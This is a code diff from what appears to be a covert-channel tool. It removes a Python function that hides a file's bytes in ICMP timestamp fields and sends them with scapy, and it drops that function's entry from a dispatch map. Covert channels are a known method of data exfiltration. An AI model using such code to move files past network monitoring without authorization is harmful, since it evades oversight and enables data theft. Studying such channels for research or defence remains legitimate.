@@ -2573,54 +2573,6 @@ def transfer_file_icmp_seq_num(client_sock: socket.socket,
         send(packet, verbose=0)
 
 
-def transfer_file_icmp_timestamp(client_sock: socket.socket,
-                                 dest_ip: str,
-                                 file_path: str):
-    """
-    Hides file data covertly in ICMP headers using the
-    timestamp field.
-
-    @note Bit length
-        The timestamp field for ICMP headers is maximum 64 bits (8 bytes)
-
-    @param client_sock:
-        A socket representing the client socket
-
-    @param dest_ip:
-        A string representing the destination IP
-
-    @param file_path:
-        A string representing the path of the file
-
-    @return: None
-    """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
-
-    # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
-
-    # c) Put data in packet
-    packets = []
-    for i in range(0, len(binary_data), 16):  # 16 bit chunks
-        binary_segment = binary_data[i:i + 16].ljust(16, '0')
-        timestamp_data = int(binary_segment, 2)
-        packet = IP(dst=dest_ip) / ICMP(ts_ori=timestamp_data)
-        packets.append(packet)
-
-    # d) Send total number of packets to the client
-    total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
-
-    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
-    time.sleep(1)
-
-    # f) Send packets
-    for packet in packets:
-        send(packet, verbose=0)
-
-
 def __get_protocol_header_function_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
@@ -2673,7 +2625,6 @@ def __get_protocol_header_function_map():
         ("ICMP", "Checksum"): transfer_file_icmp_chksum,
         ("ICMP", "Identifier"): transfer_file_icmp_identification,
         ("ICMP", "Sequence Number"): transfer_file_icmp_seq_num,
-        ("ICMP", "Timestamp"): transfer_file_icmp_timestamp,
     }
 
 
